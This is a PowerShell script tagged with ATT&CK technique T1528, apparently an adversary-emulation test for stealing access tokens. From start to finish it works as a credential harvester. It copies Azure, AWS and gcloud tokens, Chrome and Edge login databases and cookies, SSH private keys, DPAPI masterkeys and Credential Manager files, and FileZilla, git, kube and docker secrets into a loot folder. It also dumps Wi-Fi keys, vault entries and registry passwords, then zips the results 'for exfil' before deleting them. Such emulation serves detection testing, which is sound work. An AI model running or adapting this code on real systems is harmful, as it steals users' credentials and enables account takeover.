Write-Host "[T1528] Steal Application Access Tokens" -ForegroundColor Red

$lootDir = "$env:TEMP\tkn_$((Get-Random -Max 9999))"
New-Item -ItemType Directory -Path $lootDir -Force | Out-Null
$stolen = 0

$targets = @(
    "$env:LOCALAPPDATA\Microsoft\TokenBroker\Cache",
    "$env:USERPROFILE\.azure\msal_token_cache.json",
    "$env:USERPROFILE\.azure\azureProfile.json",
    "$env:USERPROFILE\.azure\accessTokens.json",
    "$env:USERPROFILE\.aws\credentials",
    "$env:USERPROFILE\.aws\config",
    "$env:APPDATA\gcloud\credentials.db",
    "$env:APPDATA\gcloud\application_default_credentials.json",
    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data",
    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies",
    "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State",
    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data",
    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Cookies",
    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State",
    "$env:USERPROFILE\.ssh\id_rsa",
    "$env:USERPROFILE\.ssh\id_ed25519",
    "$env:USERPROFILE\.git-credentials",
    "$env:USERPROFILE\.kube\config",
    "$env:USERPROFILE\.docker\config.json",
    "$env:APPDATA\FileZilla\recentservers.xml",
    "$env:APPDATA\FileZilla\sitemanager.xml"
)

foreach ($p in $targets) {
    if (Test-Path $p) {
        try {
            Copy-Item $p (Join-Path $lootDir (Split-Path $p -Leaf)) -Force -Recurse -ErrorAction Stop
            Write-Host "[+] STOLEN: $p" -ForegroundColor Yellow
            $stolen++
        } catch {
            Write-Host "[-] Locked: $p"
        }
    }
}

Write-Host "`n[*] DPAPI masterkeys..."
Get-ChildItem "$env:APPDATA\Microsoft\Protect" -Recurse -File -ErrorAction SilentlyContinue | ForEach-Object {
    try { Copy-Item $_.FullName (Join-Path $lootDir "dpapi_$($_.Name)") -Force; Write-Host "[+] DPAPI: $($_.Name)" -ForegroundColor Yellow; $stolen++ } catch {}
}

Write-Host "[*] Credential Manager files..."
Get-ChildItem "$env:LOCALAPPDATA\Microsoft\Credentials" -File -ErrorAction SilentlyContinue | ForEach-Object {
    try { Copy-Item $_.FullName (Join-Path $lootDir "cred_$($_.Name)") -Force; Write-Host "[+] CredMan: $($_.Name)" -ForegroundColor Yellow; $stolen++ } catch {}
}

Write-Host "[*] Vault and cmdkey dump..."
& vaultcmd.exe /list 2>&1
& cmdkey.exe /list 2>&1

Write-Host "[*] WiFi passwords..."
& netsh.exe wlan show profiles 2>&1 | Select-String "All User Profile" | ForEach-Object {
    $name = ($_ -split ":")[1].Trim()
    & netsh.exe wlan show profile name="$name" key=clear 2>&1
}

Write-Host "[*] Registry cred searches..."
& reg.exe query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword 2>&1
& reg.exe query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s 2>&1

Write-Host "[*] Staging for exfil..."
$archive = "$env:TEMP\tokens.zip"
Compress-Archive -Path "$lootDir\*" -DestinationPath $archive -Force -ErrorAction SilentlyContinue
if (Test-Path $archive) { Write-Host "[+] Archive: $archive ($((Get-Item $archive).Length) bytes)" -ForegroundColor Yellow }

Write-Host "`n[*] Total stolen: $stolen files"
Write-Host "[*] Cleanup..."
Remove-Item $lootDir -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item $archive -Force -ErrorAction SilentlyContinue

Write-Host "[T1528] Done." -ForegroundColor Cyan
